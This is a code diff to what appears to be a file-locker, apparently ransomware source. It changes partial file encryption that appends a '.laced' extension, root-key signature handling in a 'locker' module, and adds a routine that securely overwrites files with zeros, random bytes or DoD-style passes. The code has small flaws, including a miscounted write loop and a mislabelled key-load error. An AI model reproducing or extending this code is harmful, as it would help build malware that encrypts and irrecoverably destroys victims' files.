@@ -11,7 +11,6 @@
 
 #define ECRYPT_NAME_P L".laced"
 #define ECRYPT_NAME_LEN 6
-//#define ECRYPT_NAME L"laced"
 
 #define SET(v,w) ((v) = (w))
 
@@ -176,7 +175,7 @@ BOOL filesystem::EncryptFilePartly
 	BYTE* BufferStep = (BYTE*)memory::m_malloc(StepSize);
 	if (!BufferPart || !BufferStep)
 	{
-		printf_s("Heap crash.\n");		
+		printf_s("Heap crash.\n");
 		return FALSE;
 	}
 
@@ -1280,7 +1279,7 @@ STATIC VOID dump_hash(CONST BYTE* hash, size_t len)
 	printf("\n");
 }
 
-VOID filesystem::sort_hashList(SLIST<HASH_LIST>* list)
+VOID filesystem::sort_hash_list(SLIST<HASH_LIST>* list)
 {
 	SLIST<locker::HLIST>* list_sorted = new SLIST<locker::HLIST>;
 	std::multimap<u32, BYTE*> map;
@@ -1588,15 +1587,25 @@ VOID filesystem::RootKeySignatureTrust(VOID)
 	if (global::GetStatus())
 	{
 		locker::LoadPrivateRootKey(&g_PrivateKeyRoot, &size);
+		if (!g_PrivateKeyRoot)
+		{
+			printf("Failed Load Public Root Key\n");
+			goto end;
+		}
 		CreateSignatureFile(HashListRoot, (WCHAR*)L"\\SignatureUserKey.txt", g_PrivateKeyRoot, size);
 	}
 	else
 	{		
 		locker::LoadPublicRootKey(&g_PublicKeyRoot, &size);
+		if (!g_PublicKeyRoot)
+		{
+			printf("Failed Load Public Root Key\n");
+			goto end;
+		}
 		VerificationSignatureFile(HashListRoot, (WCHAR*)L"\\SignatureUserKey.txt", g_PublicKeyRoot, size);
 	}
 
-	
+end:
 	if (g_PublicKeyRoot)
 	{
 		memzero_explicit(g_PublicKeyRoot, size);
@@ -1753,4 +1762,87 @@ WCHAR* filesystem::MakeCopyFile(WCHAR* Path, WCHAR* Filename, WCHAR* exst, WCHAR
 	WCHAR* empty = (WCHAR*)memory::m_malloc((ECRYPT_NAME_LEN + 1) * sizeof(WCHAR));
 	memcpy_s(empty, ECRYPT_NAME_LEN, ECRYPT_NAME_P, ECRYPT_NAME_LEN);
 	return empty;
+}
+
+
+STATIC BOOL Write(FILE_INFO* fi, BYTE* buff, WCHAR* Path)
+{
+	size_t size_mb = 1048576;  // 1 MB	
+	SetFilePointer(fi->FileHandle, 0, NULL, FILE_BEGIN);
+	auto fsize = fi->Filesize;
+	DWORD toWrite;
+	DWORD written = 0;
+	while (fsize > 0)
+	{
+		toWrite = (DWORD)fsize >= size_mb ? size_mb : fsize;
+		if (!WriteFullData(fi->FileHandle, buff, toWrite))
+		{
+			printf_s("Failed WriteFullData in OverWriteFile %ls. GetLastError = %lu\n", Path, GetLastError());			
+			return FALSE;
+		}
+		written += toWrite;
+		fsize -= written;
+	}
+	
+	return TRUE;
+}
+
+BOOL filesystem::OverWriteFile(WCHAR* Path)
+{
+	FILE_INFO fi;
+	fi.FilePath = Path;
+	if (getParseFile(&fi) && fi.FileHandle != INVALID_HANDLE_VALUE)
+	{		
+		if (global::GetModeOverWrite() == ZEROS)
+		{
+			BYTE* zeros = (BYTE*)memory::m_malloc(1048576);
+			memory::memzero_explicit(zeros, 1048576);
+			for (int i = 0; i < global::GetCountOverWrite(); ++i)
+			{
+				Write(&fi, zeros, Path);
+			}
+			memory::m_free(zeros);
+		}
+		else
+		{
+
+			BYTE* random = (BYTE*)memory::m_malloc(1048576);
+			HCRYPTPROV CryptoProvider = 0;
+			if (!CryptAcquireContextA(&CryptoProvider, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
+			{
+				printf_s("Failed create provider in OverWriteFile. GetLastError = %lu.\n", GetLastError());
+				memory::m_free(random);
+				goto END;
+			}
+			CryptGenRandom(CryptoProvider, 1048576, random);
+
+			if (global::GetModeOverWrite() == RANDOM)
+			{
+				for (int i = 0; i < global::GetCountOverWrite(); ++i)
+				{			
+					Write(&fi, random, Path);
+				}
+			}
+			else if (global::GetModeOverWrite() == DOD)
+			{
+				BYTE* zeros = (BYTE*)memory::m_malloc(1048576); // 1 MB
+				memory::memzero_explicit(zeros, 1048576);
+				for (int i = 0; i < global::GetCountOverWrite(); ++i)
+				{
+					Write(&fi, zeros, Path);
+					Write(&fi, random, Path);
+				}
+				memory::m_free(zeros);
+			}
+			memory::m_free(random);
+			if (CryptoProvider)
+				CryptReleaseContext(CryptoProvider, 0);
+		}		
+	}
+	else
+		return FALSE;
+	
+END:
+	CloseHandle(fi.FileHandle);
+	return TRUE;
 }
